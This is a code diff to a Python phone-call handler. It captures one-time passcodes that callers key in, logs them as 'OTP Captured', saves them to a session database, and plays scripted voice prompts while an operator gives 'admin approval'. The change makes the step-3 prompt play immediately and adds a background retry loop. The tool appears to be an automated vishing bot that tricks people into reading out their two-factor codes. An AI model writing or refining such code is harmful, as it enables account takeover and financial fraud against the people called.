@@ -899,7 +899,7 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
             
             await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
             
-            # Update to step 3
+            # Update to step 3 FIRST before playing TTS
             await db.otp_sessions.update_one(
                 {"id": session_id},
                 {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval", "otp_digits_collected": ""}}
@@ -908,8 +908,14 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
             active_sessions[session_id]["status"] = "waiting_approval"
             active_sessions[session_id]["otp_received"] = otp_code
             
-            # Play Step 3 with retry (x2)
-            asyncio.create_task(play_step3_with_retry(session_id, session, call_id))
+            # Play Step 3 TTS immediately (not as background task)
+            await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
+            step3_text = session["messages"]["step3"]
+            await play_tts(call_id, step3_text, session.get("language", "en"))
+            await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+            
+            # Start Step 3 retry loop in background
+            asyncio.create_task(play_step3_retry_only(session_id, session, call_id))
         
     else:
         logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")
